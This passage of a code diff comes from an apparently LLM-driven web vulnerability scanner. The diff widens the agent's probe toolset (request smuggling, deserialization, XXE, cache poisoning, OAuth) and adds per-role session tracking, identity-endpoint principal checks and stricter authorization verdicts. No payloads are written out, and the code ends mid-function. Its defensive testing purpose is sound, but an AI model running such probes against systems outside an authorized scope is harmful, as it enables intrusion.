@@ -5,20 +5,24 @@ import { MAX_TOOL_RESULT_CHARS } from "./tool-output.js";
 // All tools used across the 3 stages (survey / methodology / diagnose) are defined here; run.ts uses allowedTools
 // to narrow which tools are visible per stage (= don't show Claude everything at once → prevent it from eliding work).
 
-import type { AssessmentStore, Finding, FindingVerdict, Param, Screen, ScopePolicy, Severity } from "@veritas/core";
-import { findingVerdict, isInScope } from "@veritas/core";
+import type { ApiCall, AssessmentStore, CheckExecution, CheckStatus, ExpectedAccessRule, Finding, FindingVerdict, Param, Screen, ScopePolicy, Severity } from "@veritas/core";
+import { findingVerdict, isInScope, screenChecks } from "@veritas/core";
 import type { LoginCreds, Observation, PlaywrightDriver } from "@veritas/crawler";
-import { InventoryBuilder, normalizePath, smartLogin, guessParamType, extractApiRefs, apiCallToBuiltScreen } from "@veritas/crawler";
+import { InventoryBuilder, normalizePath, smartLogin, guessParamType, extractApiRefs, apiCallToBuiltScreen, describeGraphqlOperation } from "@veritas/crawler";
 import type { LlmClient } from "@veritas/llm";
 import type { EvidenceStore, TimingProof, FetchHttpClient, HttpRequest, HttpResponse, OobProvider, TechComponent, TechSample } from "@veritas/scanner";
-import { checkTimingEvidence, fingerprintTech, formatTechInventory, lookupCves, formatCveResults, impactOracle, identityAppears, classifyCrossUserBody, auditHeaders, isPublicByDesignClientCredential, isVersionlessComponentLead } from "@veritas/scanner";
-import { placePayload, parseLocation, oobFilesToMultipart, filesHaveOobPlaceholder } from "./inject.js";
+import { checkTimingEvidence, fingerprintTech, formatTechInventory, lookupCves, formatCveResults, impactOracle, identityAppears, classifyCrossUserBody, auditHeaders, isPublicByDesignClientCredential, isVersionlessComponentLead, extractBackendLibs, stackAttackHints } from "@veritas/scanner";
+import { placePayload, parseLocation, oobFilesToMultipart, filesHaveOobPlaceholder, readJsonPath, writeJsonPath, coerceJsonLike } from "./inject.js";
+import { parseGraphqlResponse, baselineVerdict, fieldDiff, graphqlRequestBody, graphqlIdLeafPaths, mutationLooksDestructive, redactedVariablePaths } from "./graphql.js";
 import { analyzeJsSinksFull } from "./jssinks.js";
 import { bumpJwtExp, jwtForgeCandidates, parseJwt, pemFromJwks } from "./jwt.js";
 import { placeUserIdentity, userEnumMarker } from "./user-enum.js";
 import { disclosureHit, looksLikePublicWebFile } from "./disclosure.js";
 import { auditSessionCookieFlags, formatRequestDump, glanceCookie, isSessionCookieName, parseCookieHeader, parseSetCookieLines, peekJwt, SESSION_COOKIE_ATTR_KEYS } from "./session-glance.js";
 import { bearerFromOrigins, normalizeOrigins, type StorageOrigin } from "./storage-state.js";
+import { checkTargetOf, extractProbeOutcome, isAuthRedirect, isAuthWallBody, legEvaluatedInput, makePlanRow, recordCheck, sessionRefOf, subjectCtx, validAppBaseline, webOriginOf, type CheckWrite } from "./checks.js";
+import { wsHandshake } from "./ws-handshake.js";
+import { rawHttpProbe } from "./desync.js";
 import { SSRF_CONTROL, SSRF_PAYLOADS, placeSsrfTarget, ssrfHit } from "./ssrf.js";
 import { NOSQL_OP_OBJECTS, NOSQL_OP_QUERY, NOSQL_CONTROL_VALUE, nosqlTimeObject, nosqlErrorSignature, nosqlBypassConfirms, nosqlQueryUrl } from "./nosql.js";
 import { detectUrlWrapper } from "./encoding.js";
@@ -145,6 +149,53 @@ export interface PilotSession {
   // ── attended (manual multi-session auth) ──
   /** Per-role live sessions that were manually logged in. Unset = normal (single-context) mode. */
   roleSessions?: Map<string, RoleSession>;
+  // ── authorization context (operator config + session-established identity) ──
+  /** Operator-declared principal per role (manifest `principal` — launch-time config, NOT a tool argument). */
+  rolePrincipals?: Map<string, string>;
+  /** Operator-declared tenant per role (manifest `tenant`). */
+  roleTenants?: Map<string, string>;
+  /** Operator-provided identity endpoint per role (manifest `identityUrl`) — a /me-style URL the session
+   *  can read to establish its own principal, used for identity-binding ownership. */
+  roleIdentityUrls?: Map<string, string>;
+  /** Principals established AT RUNTIME from an identity endpoint response. Each entry binds the principal
+   *  to the opaque reference of the session that produced it — a credential rotation under the same role
+   *  label re-probes instead of reusing a stale identity. Distinct from operator-declared rolePrincipals;
+   *  only populated when the session actually returned a distinct identity. */
+  sessionPrincipals?: Map<string, { principal: string; sessionRef: string; evidenceId?: string }>;
+  /** Roles whose session material was REJECTED by the identity endpoint (401/403 whoami) — expired or dead.
+   *  A denial under a dead session is a session failure, never an authorization signal; declared principals
+   *  do not resurrect it. */
+  invalidRoleSessions?: Set<string>;
+  /** Operator-declared expected-access table (manifest `expectedAccess`): [{object?, endpoint?, role, allow}].
+   *  The ONLY way a "should be denied" expectation enters the system — model assertions are ignored. */
+  expectedAccess?: ExpectedAccessRule[];
+  /** Opaque session refs that have demonstrated ≥1 successful object read under THAT material — a live-
+   *  session proof distinct from identity whoami. An authenticated "denied" is only conclusive when the
+   *  comparison session is proven live (whoami binding or a proven read): a 403 under an unvalidated
+   *  session can be session rejection, not object authorization. */
+  sessionLiveReads?: Set<string>;
+  // ── per-role survey progress ──
+  /** Role label → URLs that role's session actually visited (A's visited must not suppress B's surface). */
+  visitedByRole: Map<string, Set<string>>;
+  /** Role label → every URL that role's session NAVIGATED (qualified or not) — the per-role dedupe set for
+   *  frontier/sweep/enrol/probe_paths. Distinct from visitedByRole, which only counts session-bound visits. */
+  navigatedByRole?: Map<string, Set<string>>;
+  /** Role label → that role's PENDING frontier. `frontier` is a live alias to the ACTIVE role's set —
+   *  swapped by setActiveRole — so B's navigation never deletes A's pending links. */
+  frontierByRole?: Map<string, Set<string>>;
+  /** Role label → that role's referer-gated routes. `refererGated` is a live alias to the ACTIVE role's set —
+   *  A's login bounce must not gate B's session from the same link. */
+  gatedByRole?: Map<string, Set<string>>;
+  /** Role label → visit count restored from `survey_role_progress` events on resume (the URL sets themselves
+   *  can't be rebuilt — a restored count honestly says "this role mapped N urls before the restart"). */
+  roleSurveyCounts?: Map<string, number>;
+  /** Role label → concrete block reason (login failed / session expired / no creds). Cleared when that
+   *  role's session is (re)established. Reported by survey_done; blocks "fully covered" claims. */
+  roleSurveyBlocked: Map<string, string>;
+  /** Set by analyze_session's cookie-flag audit when it could NOT establish an independent denied
+   *  control (the unauthenticated request also reached the page): the flag observation is then
+   *  fileable as suspected only — never confirmed. Cleared when a run produces a denied control. */
+  sessionFlagUnverified?: boolean;
 }
 
 /** Tools shown per stage (base names). run.ts prefixes them with `mcp__veritas__` and passes them to allowedTools. */
@@ -153,11 +204,11 @@ export const STAGE_TOOLS = {
   // recon extrapolation: after survey, read the mapped surface and forced-browse LLM-predicted unlinked endpoints.
   reconGuess: ["get_inventory", "probe_guesses", "browser_navigate", "guess_done"],
   methodology: ["get_inventory", "record_methodology", "record_methodologies", "methodology_done"],
-  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_nosql", "probe_cmdi", "probe_traversal", "probe_redirect", "probe_cors", "probe_graphql", "probe_proto", "probe_jwt", "probe_csrf", "probe_oob", "probe_ssrf", "probe_upload", "probe_logic", "probe_race", "probe_reset_poison", "probe_user_enum", "probe_secrets", "probe_headers", "analyze_session", "verify_access", "probe_idor", "analyze_js", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done", "skip_screen"],
+  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_nosql", "probe_cmdi", "probe_traversal", "probe_redirect", "probe_cors", "probe_graphql", "probe_graphql_op", "probe_proto", "probe_jwt", "probe_csrf", "probe_oob", "probe_ssrf", "probe_upload", "probe_logic", "probe_race", "probe_reset_poison", "probe_user_enum", "probe_secrets", "probe_headers", "analyze_session", "verify_access", "probe_idor", "probe_authz", "analyze_js", "probe_parser", "probe_xxe", "probe_websocket", "probe_cache", "probe_cache_poison", "probe_smuggling", "probe_crlf", "probe_host_header", "probe_oauth", "probe_method_bypass", "probe_rate_limit", "analyze_saml", "probe_deser", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done", "skip_screen"],
   // scenario (A04 cross-cutting logic): overview the inventory + fire multi-step request chains via probe_scenario. Once, after per-screen diagnosis.
   scenario: ["get_inventory", "login", "http_request", "browser_navigate", "browser_fill", "browser_click", "probe_scenario", "probe_race", "probe_reset_poison", "probe_user_enum", "probe_secrets", "record_finding", "scenario_done"],
   // fingerprint (A06 known-vulnerable components): fingerprint_scan to collect versions, evaluate known CVEs (cve_lookup opt-in) and record.
-  fingerprint: ["fingerprint_scan", "cve_lookup", "http_request", "record_finding", "fingerprint_done"],
+  fingerprint: ["fingerprint_scan", "probe_parser", "cve_lookup", "http_request", "record_finding", "fingerprint_done"],
 } as const;
 
 const txt = (s: string): { content: { type: "text"; text: string }[] } => ({ content: [{ type: "text", text: s }] });
@@ -365,7 +416,7 @@ export function stripProtoEcho(body: string): string {
 }
 
 /** Structural marker for GraphQL request batching: a JSON array of >=2 GraphQL results. Shared by probe_graphql and
- *  record_finding's rate-limit/batching branch — the evidence is the response SHAPE (array vs single object), which
+ *  record_finding's info-disclosure/batching branch — the evidence is the response SHAPE (array vs single object), which
  *  the body-length/status differential cannot express (the array is exactly 2x a small body on the same status).
  *  The per-element "(data|errors)" requirement keeps a verbatim request-echo from satisfying it. */
 export function isGraphqlBatchResponse(body: string): boolean {
@@ -417,11 +468,13 @@ export function nonexistentIdLike(id: string): string {
 }
 
 /** WHERE an id lives on a request — so probe_idor's sweep can place a fuzzed id in each id-bearing field's OWN location
- *  (query/body/header/path), not just the single one the model named. */
+ *  (query/body/header/path), not just the single one the model named. `json-field` covers nested JSON/GraphQL
+ *  variables paths (e.g. "variables.input.ownerId") — the typed JSON-path setter replaces exactly that value. */
 export type IdParamLoc =
   | { via: "header"; name: string }
   | { via: "query"; name: string }
   | { via: "body-field"; name: string }
+  | { via: "json-field"; pointer: string }
   | { via: "path"; example: string };
 
 /** Set/replace a field in a form-urlencoded body (append if absent). Used to place a fuzzed id into a body-param location. */
@@ -448,6 +501,170 @@ export function replacePathSeg(u: string, seg: string, val: string): string | nu
   } catch {
     return null;
   }
+}
+
+/** Auth material for replaying a request AS another role WITHOUT disturbing the current session:
+ *  attended live sessions and Cookie-file roles resolve to headers directly; credentials-only roles can't be
+ *  replayed out-of-band (their session lives in the browser) → null, the caller tells the model to login(role). */
+async function roleAuthHeaders(s: PilotSession, role: string): Promise<Record<string, string> | null> {
+  if (role === "unauth") return {};
+  const live = s.roleSessions?.get(role);
+  if (live) {
+    const cookie = await live.driver.sessionCookieHeader().catch(() => live.cookie);
+    const bearer = await live.driver.bearerToken().catch(() => null);
+    return { ...(cookie ? { cookie } : {}), ...(bearer ? { authorization: `Bearer ${bearer}` } : {}) };
+  }
+  const cookieFile = s.roleCookieFiles.get(role);
+  if (cookieFile) {
+    const loaded = loadCookieFile(cookieFile, s.targetUrl);
+    return { ...(loaded.header ? { cookie: loaded.header } : {}), ...(loaded.bearer ? { authorization: `Bearer ${loaded.bearer}` } : {}) };
+  }
+  return null; // roleCreds-only: no replayable material without a login() call
+}
+
+/** Candidate identity fields in a whoami-style response, in precedence order. A principal must come
+ *  from an actual identity-bearing field — a role name, configured username, or unsigned JWT claim
+ *  is never accepted as a principal (per the authz trust contract). */
+const IDENTITY_FIELDS = ["id", "sub", "userId", "user_id", "accountId", "account_id", "memberId", "employeeId", "uid", "email", "username"];
+
+function identityFromBody(body: string): string | null {
+  try {
+    const j = JSON.parse(body) as unknown;
+    const roots: unknown[] = [];
+    if (j && typeof j === "object") {
+      const o = j as Record<string, unknown>;
+      roots.push(o, o.data, o.user, o.account, o.profile, o.me, o.result);
+    }
+    for (const r of roots) {
+      if (!r || typeof r !== "object") continue;
+      const rec = r as Record<string, unknown>;
+      for (const f of IDENTITY_FIELDS) {
+        const v = rec[f];
+        if (typeof v === "string" && v) return v;
+        if (typeof v === "number" && Number.isFinite(v)) return String(v);
+      }
+    }
+  } catch {
+    /* not JSON */
+  }
+  return null;
+}
+
+/** Establish a role's PRINCIPAL from its own session: GET the operator-configured identityUrl as that
+ *  session and read a distinct identity field out of the response. The result is recorded into
+ *  s.sessionPrincipals (survives restarts via… in-memory for now — re-fetched on demand) and the call
+ *  itself is preserved as evidence. Two roles returning the SAME principal stay honestly the same
+ *  principal (an alias, not two users). No identityUrl → no principal (unverified, not fabricated). */
+/** Establish a role's principal via its configured identityUrl under the role's OWN session —
+ *  returns the identity evidenceId when a whoami leg ran (undefined when none was needed/possible).
+ *  The cached principal is bound to the session's opaque reference: a credential rotation under the
+ *  same role label re-probes rather than reusing a stale identity. The leg sends ONLY the resolved
+ *  session material (inheritDefaultHeaders:false — ambient Basic/Cookie/custom headers never mix in). */
+async function establishPrincipal(s: PilotSession, role: string): Promise<string | undefined> {
+  if (!s.sessionPrincipals) s.sessionPrincipals = new Map();
+  if (!s.invalidRoleSessions) s.invalidRoleSessions = new Set();
+  if (/^(unauth|anonymous|anon|guest|none)$/i.test(role)) return undefined; // no principal exists for an anonymous leg
+  const url = s.roleIdentityUrls?.get(role);
+  // No identity endpoint → nothing to validate the live session against; a declared principal stands as-is.
+  if (!url || !isInScope(url, s.scope)) return undefined;
+  const headers = (await roleAuthHeaders(s, role)) ?? (role === s.currentRole ? authHeaders(s) : null);
+  if (headers === null) return undefined;
+  const ref = sessionRefOf(s.http.effectiveHeaders(headers, false));
+  const cached = s.sessionPrincipals.get(role);
+  if (cached && cached.sessionRef === ref) return cached.evidenceId; // same session material → same identity
+  try {
+    const res = await s.http.send({ method: "GET", url, headers, inheritDefaultHeaders: false });
+    bumpHttp(s, res.status);
+    const ev = s.evidence.record({
+      screenId: s.currentScreenId ?? "pilot",
+      validator: "veritas-whoami",
+      kind: "positive_replay",
+      request: { method: "GET", url, headers: s.http.effectiveHeaders(headers, false), body: null },
+      response: res,
+      note: `identity probe for role '${role}'`,
+    });
+    // The identity endpoint REJECTED this session — expired/dead. A declared principal does not resurrect it;
+    // the role is marked invalid so downstream comparisons can't mistake a dead session for an authorization
+    // signal. Any cached/observed principal for this session material is dropped.
+    if (res.status === 401 || res.status === 403) {
+      s.invalidRoleSessions.add(role);
+      s.sessionPrincipals.delete(role);
+      return ev.id;
+    }
+    const id = res.status < 400 ? identityFromBody(res.body) : null;
+    if (res.status >= 200 && res.status < 400) {
+      // The endpoint answered this session — live-session proof regardless of whether a principal parsed.
+      (s.sessionLiveReads ??= new Set()).add(ref);
+    }
+    if (!id) return undefined;
+    s.invalidRoleSessions.delete(role); // a live session clears any earlier invalid marking under new material
+    s.sessionPrincipals.set(role, { principal: id, sessionRef: ref, evidenceId: ev.id });
+    s.store.appendEvent(s.assessmentId, {
+      type: "note",
+      payload: { message: `🪪 role '${role}' principal established: ${id} (identity endpoint, evidence ${ev.id})` },
+    });
+    return ev.id;
+  } catch {
+    return undefined; // identity probe failed — principal stays unestablished
+  }
+}
+
+/** Which configured role's session material produced a session ref — attributes evidence to the actor
+ *  that actually SENT it. A caller's current role label can never relabel an earlier session's legs. */
+async function roleForSessionRef(s: PilotSession, ref: string): Promise<string | undefined> {
+  const matches = (headers: Record<string, string> | null): boolean =>
+    !!headers && sessionRefOf(s.http.effectiveHeaders(headers, true)) === ref;
+  if (s.currentRole && matches(authHeaders(s))) return s.currentRole;
+  const roles = new Set<string>([
+    ...(s.roleSessions?.keys() ?? []),
+    ...s.roleCookieFiles.keys(),
+    ...s.roleCreds.keys(),
+    ...s.roleDescriptions.keys(),
+  ]);
+  for (const role of roles) {
+    if (role === s.currentRole) continue;
+    try {
+      if (matches(await roleAuthHeaders(s, role))) return role;
+    } catch {
+      /* session material unresolvable for this role — skip */
+    }
+  }
+  return undefined;
+}
+
+/** A GraphQL operation's id-bearing VARIABLE leaf (variables.input.ownerId) — idBearingParamLocs' counterpart for
+ *  ops stored on Screen.apis. `req` is the request template to replay that operation (its observed variables). */
+export function graphqlIdParamLocs(apis: ReadonlyArray<ApiCall>, baseUrl: string): Array<{ name: string; example: string; loc: IdParamLoc; write: boolean; req: { url: string; method: string; body: string } }> {
+  const out: Array<{ name: string; example: string; loc: IdParamLoc; write: boolean; req: { url: string; method: string; body: string } }> = [];
+  const seen = new Set<string>();
+  for (const a of apis) {
+    const g = a.graphql;
+    if (!g) continue;
+    let url: string;
+    try {
+      url = new URL(a.urlTemplate, baseUrl).toString();
+    } catch {
+      continue;
+    }
+    for (const leaf of graphqlIdLeafPaths(g.variablesExample)) {
+      // Dedup per (endpoint, operation, leaf): two ops sharing variables.id are DIFFERENT resolvers — both sweep.
+      const k = `${url}${g.operationKey}${leaf.pointer}`;
+      if (seen.has(k)) continue;
+      seen.add(k);
+      out.push({
+        name: leaf.pointer.replace(/^variables\./, "vars."), // short label for sweep output
+        example: leaf.example,
+        loc: { via: "json-field", pointer: leaf.pointer },
+        write: g.operationType === "mutation",
+        req: {
+          url,
+          method: "POST",
+          body: graphqlRequestBody({ document: g.document, operationName: g.operationName }, g.variablesExample),
+        },
+      });
+    }
+  }
+  return out;
 }
 
 /** Deterministically pick a screen's id-bearing params (guessedType id/object_ref, or the rule re-derives one from
@@ -884,20 +1101,32 @@ export function protectedContentLeaked(unauthBody: string, authBody: string): bo
 }
 
 /** Unauthenticated/authenticated responses → machine verdict for auth-bypass.
- *  302→login / 401 / 403 / non-200 / login body are all **not_bypass (auth is enforced, can't be overturned)**.
+ *  302→login / 401 / 403 / non-200 / login body are all **not_bypass (auth is enforced, can't be overturned)** —
+ *  but ONLY when the authenticated baseline actually reached the app (2xx, non-login). An auth leg that
+ *  5xx'd, redirected, or was never sent means enforcement is asserted with no valid baseline → inconclusive.
  *  A **needs_judgment** now additionally requires the unauth body to REPRODUCE the authed protected content (mechanical
  *  body-match) — so a generic/public 200 can't be recorded as auth-bypass on judgment alone. */
 export function classifyAccess(
   unauth: { status: number; location?: string; body: string },
   auth: { status: number; body: string } | null,
 ): { verdict: AccessVerdict; reason: string } {
+  const authBaselineOk = auth != null && auth.status >= 200 && auth.status < 300 && !looksLikeLogin(auth.body);
+  const denial = (reason: string): { verdict: AccessVerdict; reason: string } =>
+    authBaselineOk
+      ? { verdict: "not_bypass", reason }
+      : {
+          verdict: "inconclusive",
+          reason: `${reason} — but no valid authenticated baseline was established${auth ? ` (authed → ${auth.status})` : " (no authenticated session)"}; enforcement cannot be verified`,
+        };
   if (unauth.status >= 300 && unauth.status < 400)
-    return { verdict: "not_bypass", reason: `unauth → ${unauth.status} redirect${unauth.location ? ` (${unauth.location})` : ""} = auth enforced` };
-  if (unauth.status === 401 || unauth.status === 403)
-    return { verdict: "not_bypass", reason: `unauth → ${unauth.status} = auth enforced` };
-  if (unauth.status !== 200)
-    return { verdict: "not_bypass", reason: `unauth → ${unauth.status} (no protected content)` };
-  if (looksLikeLogin(unauth.body)) return { verdict: "not_bypass", reason: "unauth body is a login/denied page, not protected content" };
+    return denial(`unauth → ${unauth.status} redirect${unauth.location ? ` (${unauth.location})` : ""} = auth enforced`);
+  if (unauth.status === 401 || unauth.status === 403) return denial(`unauth → ${unauth.status} = auth enforced`);
+  // A 5xx is the server failing, not an authorization verdict — nothing about access was decided,
+  // so the comparison is inconclusive (unverified), never "auth enforced".
+  if (unauth.status >= 500)
+    return { verdict: "inconclusive", reason: `unauth → ${unauth.status} (server error — no authorization decision was reached)` };
+  if (unauth.status !== 200) return denial(`unauth → ${unauth.status} (no protected content)`);
+  if (looksLikeLogin(unauth.body)) return denial("unauth body is a login/denied page, not protected content");
   // reaching here means unauth 200 & non-login = gray
   if (!auth) return { verdict: "inconclusive", reason: "no authenticated session to compare — login(role) first" };
   if (auth.status >= 300 || looksLikeLogin(auth.body))
@@ -914,10 +1143,13 @@ export function classifyAccess(
  *  Excludes out-of-scope / logout-ish / ignore_paths / already-visited. */
 export function frontierLinks(
   o: Pick<Observation, "finalUrl" | "links"> & { virtualRoutes?: string[] },
-  s: Pick<PilotSession, "scope" | "lockToSeeds" | "visited" | "ignorePaths" | "targetUrl" | "refererGated">,
+  s: Pick<PilotSession, "scope" | "lockToSeeds" | "visited" | "navigatedByRole" | "currentRole" | "ignorePaths" | "targetUrl" | "refererGated">,
 ): string[] {
   if (s.lockToSeeds) return [];
   const out = new Set<string>();
+  // Per-role navigated: a URL role A already walked must still be OFFERED to role B — its session sees
+  // different surface — while neither role is re-offered what its own session already navigated.
+  const seen = s.navigatedByRole?.get(s.currentRole || "unauth") ?? s.visited;
   // In addition to normal links, also add SPA virtual routes the driver captured via pushState/hashchange to the frontier
   // (hash-routed SPAs tend to collapse hrefs, so we backfill from the routes actually walked).
   for (const link of [...o.links, ...(o.virtualRoutes ?? [])]) {
@@ -931,7 +1163,7 @@ export function frontierLinks(
     if (isSessionDestroyingPath(abs)) continue; // don't add logout/signout links to the frontier (self-sabotage if walked)
     if (pathIsIgnored(abs, s.ignorePaths, s.targetUrl)) continue; // don't add low-value paths the model pruned
     if (s.refererGated.has(abs)) continue; // known to bounce to the error page on cold nav — don't re-queue it for goto
-    if (!s.visited.has(abs)) out.add(abs);
+    if (!seen.has(abs)) out.add(abs);
   }
   return [...out];
 }
@@ -970,6 +1202,64 @@ export function plannedClassesFor(plan: string | undefined): string[] {
     if (cc && !EXCLUDED.has(cc)) out.add(cc);
   }
   return [...out];
+}
+
+/** Classes that test PER INPUT (a param or an API surface): one execution never satisfies other inputs. */
+const PARAM_BOUND_PLAN_CLASSES = new Set([
+  "sqli", "nosql", "ssti", "xss-reflected", "rce", "path-traversal", "open-redirect", "ssrf", "xxe",
+  "prototype-pollution", "mass-assignment", "price-tampering", "qty-tampering", "user-enumeration", "csrf",
+]);
+/** Classes that test PER OBJECT reference (id-bearing params / GraphQL id-bearing operation leaves). */
+const OBJECT_BOUND_PLAN_CLASSES = new Set(["idor", "idor-write"]);
+/** Hard cap on plan slots per (screen, class) — bounded coverage, never an unbounded sweep. */
+const MAX_PLAN_SLOTS_PER_CLASS = 24;
+
+/** Expand a methodology's declared classes into BOUNDED plan rows: input-bound classes get one slot per
+ *  (param | API surface), object-bound classes one slot per id-bearing location / GraphQL operation leaf,
+ *  screen-level classes one slot. Every slot is a ledger row (status "planned") that an execution must
+ *  satisfy — a single probe cannot answer for other params, endpoints, roles, or objects. */
+function writePlanSlots(s: PilotSession, screenId: string, vulnClasses: string[]): number {
+  const sc = s.inv.screens().find((x) => x.screenId === screenId);
+  if (!sc) return 0;
+  const classes = plannedClassesFor(`classes=[${vulnClasses.join(",")}]`);
+  let wrote = 0;
+  for (const cls of classes) {
+    const rows: ReturnType<typeof makePlanRow>[] = [];
+    if (OBJECT_BOUND_PLAN_CLASSES.has(cls)) {
+      // One slot per id-bearing location (REST) / per GraphQL operation leaf — each is its own object scope.
+      for (const p of idBearingParamLocs(sc.params)) rows.push(makePlanRow(screenId, cls, "*", p.name));
+      for (const a of sc.apis) {
+        if (!a.graphql) continue;
+        const target = checkTargetOf(a.method, a.urlTemplate, s.targetUrl, a.graphql.operationKey);
+        const leaves = graphqlIdLeafPaths(a.graphql.variablesExample);
+        if (leaves.length === 0) rows.push(makePlanRow(screenId, cls, target, undefined));
+        for (const leaf of leaves) rows.push(makePlanRow(screenId, cls, target, leaf.pointer));
+      }
+    } else if (PARAM_BOUND_PLAN_CLASSES.has(cls)) {
+      for (const p of sc.params) rows.push(makePlanRow(screenId, cls, "*", p.name));
+      for (const a of sc.apis)
+        rows.push(makePlanRow(screenId, cls, checkTargetOf(a.method, a.urlTemplate, s.targetUrl, a.graphql?.operationKey), undefined));
+      if (sc.params.length === 0 && sc.apis.length === 0) rows.push(makePlanRow(screenId, cls, "*", undefined));
+    } else {
+      rows.push(makePlanRow(screenId, cls, "*", undefined));
+    }
+    for (const row of rows.slice(0, MAX_PLAN_SLOTS_PER_CLASS)) {
+      s.store.upsertCheck(s.assessmentId, row);
+      wrote += 1;
+    }
+  }
+  return wrote;
+}
+
+/** Plans written before this ledger existed (or on a resumed run) have no slot rows — materialize them
+ *  on demand at screen_done so legacy plans are still bound to concrete slots. */
+function ensurePlanSlots(s: PilotSession, screenId: string): void {
+  if (s.store.checks(s.assessmentId).some((c) => c.screenId === screenId && c.status === "planned")) return;
+  const plan = s.plans.get(screenId);
+  if (!plan) return;
+  const m = /^classes=\[([^\]]*)\]/.exec(plan);
+  if (!m) return;
+  writePlanSlots(s, screenId, (m[1] ?? "").split(",").map((x) => x.trim()).filter(Boolean));
 }
 
 /** screen_done coverage gate (pure). Requires that coverage accounts for every planned attack class, and that
@@ -1057,6 +1347,102 @@ export function isAuthWalled(
   return s.findings.length === 0 && s.httpProbes >= minSample && s.httpThrough === 0 && s.httpAuthWall / s.httpProbes >= 0.85;
 }
 
+/** The survey role a navigation/pending set belongs to: the logged-in role label, or "unauth". */
+function activeRoleKey(s: PilotSession): string {
+  return s.currentRole || "unauth";
+}
+/** Get-or-create the per-role set in a (possibly absent) backing map. */
+function roleSet(map: Map<string, Set<string>> | undefined, role: string): Set<string> {
+  let set = map?.get(role);
+  if (!set && map) { set = new Set(); map.set(role, set); }
+  return set ?? new Set<string>();
+}
+/** Every URL the ACTIVE role's session already navigated (its per-role dedupe set). The backing map is
+ *  created lazily — on first use it attributes the pre-existing global union to the CURRENT role (whatever
+ *  session was active when per-role tracking began), then tracks per-role from there. */
+function roleNavigated(s: PilotSession): Set<string> {
+  if (!s.navigatedByRole) s.navigatedByRole = new Map([[activeRoleKey(s), new Set(s.visited)]]);
+  return roleSet(s.navigatedByRole, activeRoleKey(s));
+}
+/** Union of EVERY role's pending frontier — "work remaining" for survey_done/status across all sessions. */
+function unionFrontier(s: PilotSession): Set<string> {
+  const out = new Set<string>(s.frontier);
+  for (const set of s.frontierByRole?.values() ?? []) for (const u of set) out.add(u);
+  return out;
+}
+/** Swap the ACTIVE role: stash the outgoing role's frontier/gated, install the incoming role's sets
+ *  (fresh if never activated). `s.frontier`/`s.refererGated` are live aliases — per-role via this swap —
+ *  so every existing mutation site stays per-role without call-site churn. The backing maps are created
+ *  lazily so ANY session construction (fixtures included) gets real per-role isolation. */
+function setActiveRole(s: PilotSession, role: string): void {
+  const from = activeRoleKey(s);
+  const to = role || "unauth";
+  if (from !== to) {
+    s.frontierByRole ??= new Map();
+    s.gatedByRole ??= new Map();
+    s.frontierByRole.set(from, s.frontier);
+    s.gatedByRole.set(from, s.refererGated);
+    s.frontier = roleSet(s.frontierByRole, to);
+    s.refererGated = roleSet(s.gatedByRole, to);
+  }
+  s.currentRole = role;
+}
+
+/** The current per-role survey snapshot, for survey_role_progress persistence. */
+function roleSurveySnapshot(s: PilotSession, role: string) {
+  const isActive = role === activeRoleKey(s);
+  return {
+    visited: s.visitedByRole?.get(role)?.size ?? s.roleSurveyCounts?.get(role) ?? 0,
+    urls: s.visitedByRole?.get(role) ? [...s.visitedByRole.get(role)!] : [],
+    pending: [...(s.frontierByRole?.get(role) ?? (isActive ? s.frontier : undefined) ?? new Set<string>())],
+    gated: [...(s.gatedByRole?.get(role) ?? (isActive ? s.refererGated : undefined) ?? new Set<string>())],
+    seen: [...(s.navigatedByRole?.get(role) ?? (isActive ? s.visited : undefined) ?? new Set<string>())],
+  };
+}
+/** Persist the role's full survey state (visited + pending + gated + navigated) append-only — a resume
+ *  restores all of it, so pending links discovered before a pause never silently disappear. */
+function emitRoleProgress(s: PilotSession, role: string, state: "mapped" | "blocked", reason?: string): void {
+  s.store.appendEvent(s.assessmentId, {
+    type: "survey_role_progress",
+    payload: { role, ...roleSurveySnapshot(s, role), state, ...(reason ? { reason: reason.slice(0, 200) } : {}) },
+  });
+}
+
+/** Record a role's survey state as blocked with a concrete reason — appended as survey_role_progress so a
+ *  resume restores the block instead of re-refusing forever, and a note so the reason stays visible. */
+function markRoleSurveyBlocked(s: PilotSession, role: string, why: string): void {
+  if (!role || role === "unauth") return;
+  if (s.roleSurveyBlocked?.get(role) === why) return; // already recorded this exact state
+  s.roleSurveyBlocked?.set(role, why);
+  s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `⛔ role '${role}' auth blocked: ${why}` } });
+  emitRoleProgress(s, role, "blocked", why);
+}
+
+/** Sign-out / log-out chrome — a control that only renders when the server believes the session is
+ *  authenticated. Functional UI elements (link/clickable/form), not descriptive prose. */
+const SIGNOUT_RE = /(sign|log)[\s_-]*out|sign[\s_-]*off|log[\s_-]*off|logout|signout|ログアウト|サインアウト/i;
+/** Identity/profile-shaped API paths — a 2xx from one of these under the session is real auth evidence
+ *  (the same request unauthenticated answers 401/empty). */
+const IDENTITY_API_RE = /\/(me|whoami|profile|account|user(?:s)?|session|self|current[-_]?user|identity|auth\/(?:me|status|session))(?:[/?#._-]|$)/i;
+
+/** Does this observation demonstrate the ROLE's session actually reached authenticated surface ON THIS PAGE?
+ *  Real observed signals only: sign-out chrome rendered for a logged-in browser, or an identity/profile
+ *  API call that carried session material and was answered (2xx/3xx). A cookie header's mere presence is
+ *  not proof — an anonymous/public page under a valid cookie must not count; an arbitrary profile-URL 2xx
+ *  without session material is not evidence either; and a whoami binding only proves session LIVENESS at
+ *  login time — it says nothing about THIS page. 4xx/5xx/login/error pages can never count. */
+function sessionBoundEvidence(_s: PilotSession, o: Observation): boolean {
+  if (o.status >= 400 || looksLikeErrorCatchAll(o) || looksLikeLogin(o.visibleText)) return false;
+  const signOutChrome =
+    o.links.some((l) => SIGNOUT_RE.test(l)) ||
+    (o.clickables ?? []).some((c) => SIGNOUT_RE.test(c.text) || SIGNOUT_RE.test(c.selector)) ||
+    o.forms.some((f) => SIGNOUT_RE.test(f.action ?? ""));
+  const identityApi = o.apiCalls.some(
+    (a) => a.status >= 200 && a.status < 400 && (a.hasAuthorizationHeader || a.hasCookieHeader) && IDENTITY_API_RE.test(a.url),
+  );
